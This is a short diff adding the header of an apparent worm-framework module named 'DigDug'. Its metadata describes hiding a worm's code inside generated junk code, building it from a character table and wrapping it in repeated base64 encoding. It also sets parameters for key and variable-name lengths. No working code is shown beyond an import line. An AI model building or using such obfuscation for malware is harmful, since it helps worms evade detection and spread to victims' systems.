@@ -1,0 +1,14 @@
+#!name##DigDug
+#!types##shadow
+#!info##Hides code in generated junk code making it harder to find. It creates a table from which it gradually builds code. Adds a great deal of code which will increase the size of the worm.
+#!reqVar##Dig_var_len##The base number of characters used to generate names for variables.##int
+#!setVar##Dig_var_len##32##int
+#!reqVar##Dig_key_len##Number of 'key' characters in the character table. The more characters, the harder it is to identify the key.##int
+#!setVar##Dig_key_len##32##int
+#!reqVar##Dig_mkey_rand##Base value for the number of elements generated to hide the key.##int
+#!setVar##Dig_mkey_rand##12##int
+#!reqVar##Dig_run_count##Number of base64 encodings used for the function that builds the code.##int
+#!setVar##Dig_run_count##8##int
+
+import base64
+
